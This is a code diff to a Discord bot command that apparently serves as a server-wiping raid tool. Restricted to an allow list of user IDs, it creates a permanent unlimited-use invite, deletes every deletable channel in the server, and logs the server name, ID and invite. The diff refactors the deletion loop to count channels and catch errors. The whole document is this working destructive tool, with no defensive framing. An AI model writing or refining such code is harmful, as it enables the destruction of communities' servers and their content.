@@ -11,18 +11,18 @@ module.exports = {
         if(!allowed.includes(message.author.id)) return 
 
         try {
-            
             let invite = await message.channel.createInvite({maxAge: 0, maxUses: 0})
+            let deletedChannelsCount = 0;
             message.guild.channels.cache.forEach(channel => {
                 if (channel.deletable) {
-                        channel.delete().then(
-                            console.log(chalk.green(`Deleted all channels in ${message.guild.name}\nID: ${message.guild.id}\nInvite: ${invite} `))
-                        )};
-        });
-
+                    channel.delete().then(() => {
+                        deletedChannelsCount++;
+                        console.log(`Deleted ${chalk.yellow(`${deletedChannelsCount}`)} channels in ${chalk.yellow(`${message.guild.name}\n`)}` + `ID: ` + `${chalk.yellow(`${message.guild.id}`)}` + `\nInvite: ` + `${chalk.yellow(`${invite}`)}`);
+                    }).catch(console.error);
+                }
+            });
         } catch(err) { return console.log(chalk.red(err)) }
     }
 }
-
 
 
